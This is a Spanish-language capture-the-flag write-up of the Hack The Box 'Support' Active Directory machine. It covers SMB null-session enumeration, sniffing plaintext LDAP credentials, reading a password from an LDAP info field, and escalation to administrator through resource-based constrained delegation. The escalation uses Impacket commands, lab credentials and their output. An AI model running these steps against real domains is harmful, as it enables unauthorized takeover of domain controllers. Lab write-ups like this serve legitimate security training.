---
title: "Support (Easy)"
date: 2026-01-13
author: "Isma"
tags: ["Windows", "AD", "RBCD"]
categories: ["Machine"]
slug: "support"
draft: false
---


## Resumen


Write-up de la máquina **Support (Easy)**. Incluye enumeración, extracción de credenciales, acceso como usuario y escalada mediante **RBCD**.


![Imagen del post](/images/notion/2e8888fa-f353-8013-b9cf-e4e76515e53d.png)


## Enumeración


### Escaneo de puertos


```powershell
PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain        syn-ack ttl 127 Simple DNS Plus
88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-12-26 16:39:41Z)
135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: support.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds? syn-ack ttl 127
464/tcp   open  kpasswd5?     syn-ack ttl 127
593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped    syn-ack ttl 127
3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: support.htb0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped    syn-ack ttl 127
5985/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        syn-ack ttl 127 .NET Message Framing
49664/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49667/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49680/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
49692/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49697/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49714/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 19155/tcp): CLEAN (Timeout)
|   Check 2 (port 37046/tcp): CLEAN (Timeout)
|   Check 3 (port 25972/udp): CLEAN (Timeout)
|   Check 4 (port 12574/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: 5s
| smb2-time: 
|   date: 2025-12-26T16:40:34
|_  start_date: N/A
```


### SMB (445)


Se puede enumerar mediante **null session**.


![Imagen del post](/images/notion/2e7888fa-f353-8068-aea3-c601dc4e36a7.png)


![Imagen del post](/images/notion/2e7888fa-f353-80c1-8a62-d91125cc9722.png)


Recogemos herramientas para el análisis y llama la atención **UserInfo.exe**. Lo descomprimimos y revisamos DLLs y ficheros de configuración. Con `strings` no aparece nada útil inicialmente.


## Análisis de UserInfo.exe (extracción de credenciales)


Para poder ejecutar el binario desde Kali, instalamos dependencias y lo probamos con **mono**.


```powershell
┌──(root㉿kali)-[/home/…/Desktop/HTB/Support/loot]
└─# mono UserInfo.exe -find 

Usage: UserInfo.exe [options] [commands]

Options: 
  -v|--verbose        Verbose output                                    

Commands: 
  find                Find a user                                       
  user                Get information about a user                      

'-find' is not recognized as a valid command or option.

Did you mean: 
        find

                                                                                                                                                                                                                 
┌──(root㉿kali)-[/home/…/Desktop/HTB/Support/loot]
└─# mono UserInfo.exe find  
[-] At least one of -first or -last is required.
                                                                                                                                                                                                                 
┌──(root㉿kali)-[/home/…/Desktop/HTB/Support/loot]
└─# mono UserInfo.exe find -first lala  
[-] Exception: Connect Error
```


Aparece un **Connect Error**. Abrimos Wireshark para entender qué ocurre.


![Imagen del post](/images/notion/2e7888fa-f353-80a2-9911-db18444f20db.png)


La causa es que necesitamos resolver el dominio (añadir el nombre de dominio a la IP, para que el DNS resuelva correctamente).


Al revisar el tráfico, vemos que **UserInfo.exe** se comunica con el servidor usando el usuario **ldap**.


![Imagen del post](/images/notion/2e7888fa-f353-80f3-b919-f11fcdc5ac33.png)


Lo importante: las credenciales viajan **en texto plano**, así que obtenemos el primer par usuario:contraseña.


```plain text
ldap:nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz
```


![Imagen del post](/images/notion/2e7888fa-f353-809d-a8b6-e687ba095d23.png)


## Enumeración de AD


Con estas credenciales lanzamos enumeración con BloodHound.


![Imagen del post](/images/notion/2e7888fa-f353-803c-b3ce-f921b4ceb5cb.png)


No aparece un camino directo, pero destaca el usuario **support.htb**, ya que pertenece a un grupo no estándar.


![Imagen del post](/images/notion/2e7888fa-f353-808f-8e7c-e6ca43ccc88c.png)


Como BloodHound no siempre recoge todo, enumeramos también vía **LDAP** para obtener campos adicionales (por ejemplo, `info`).


```powershell
ldapsearch -H ldap://support.htb -D 'ldap@support.htb' -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -b 'DC=support,DC=htb' > ldap.out
```


En la salida encontramos una credencial en claro en el campo `info` de un usuario.


![Imagen del post](/images/notion/2e7888fa-f353-80c5-bfc1-f96394a9d81e.png)


```plain text
support.htb:Ironside47pleasure40Watchful
```


![Imagen del post](/images/notion/2e7888fa-f353-805f-a01f-f76834589eda.png)


Con esto obtenemos la **user flag**.


![Imagen del post](/images/notion/2e7888fa-f353-8000-98a8-db67e2aaa6a7.png)


## Escalada: Resource-Based Constrained Delegation (RBCD)


A partir del grafo de BloodHound, el camino a **Domain Admin** pasa por **RBCD**.


### Resumen rápido de RBCD

- **Objetivo:** lograr que un equipo/servicio acepte que nuestra cuenta puede **suplantar** (impersonate) a otro usuario al pedir tickets Kerberos.
- **Idea:** crear una cuenta de máquina controlada por el atacante, permitirle actuar en nombre de otros sobre el objetivo y luego solicitar un ticket para un servicio del objetivo suplantando a `Administrator`.

### Paso 1: crear una cuenta de equipo controlada por el atacante


    (Usamos Impacket para crear `ATTACKERSYSTEM$`.)


```powershell
┌──(root㉿kali)-[/home/kali]
└─# impacket-addcomputer -method SAMR -computer-name 'ATTACKERSYSTEM$' -computer-pass 'Summer2018!' -dc-host 10.129.230.181 -domain-netbios support.htb 'support.htb/support:Ironside47pleasure40Watchful'
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Successfully added machine account ATTACKERSYSTEM$ with password Summer2018!.
```


### Paso 2: permitir delegación sobre el objetivo (DC$)


    Escribimos el atributo para que `ATTACKERSYSTEM$` pueda actuar en nombre de otros usuarios sobre el objetivo.


```powershell
┌──(root㉿kali)-[/home/kali]
└─# impacket-rbcd -delegate-from 'ATTACKERSYSTEM$' -delegate-to 'DC$' -action 'write' -dc-ip 10.129.230.181 'support.htb/support:Ironside47pleasure40Watchful'
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Attribute msDS-AllowedToActOnBehalfOfOtherIdentity is empty
[*] Delegation rights modified successfully!
[*] ATTACKERSYSTEM$ can now impersonate users on DC$ via S4U2Proxy
[*] Accounts allowed to act on behalf of other identity:
[*]     ATTACKERSYSTEM$   (S-1-5-21-1677581083-3380853377-188903654-6103)
```


### Paso 3: solicitar un Service Ticket suplantando a Administrator


```powershell
┌──(root㉿kali)-[/home/kali]
└─# impacket-getST -spn 'cifs/dc.support.htb' -impersonate 'administrator' 'support.htb/attackersystem$:Summer2018!'
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[-] CCache file is not found. Skipping...
[*] Getting TGT for user
[*] Impersonating administrator
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Saving ticket in administrator@cifs_dc.support.htb@SUPPORT.HTB.ccache
                                                                                                                                                                                                                 
klist   
                                                                                                                                                                                                                 
export KRB5CCNAME=administrator@cifs_dc.support.htb@SUPPORT.HTB.ccache
```


![Imagen del post](/images/notion/2e7888fa-f353-8030-a1a9-e5afe5793bfe.png)


Con el ticket en sesión, ya tenemos acceso como **administrator**.

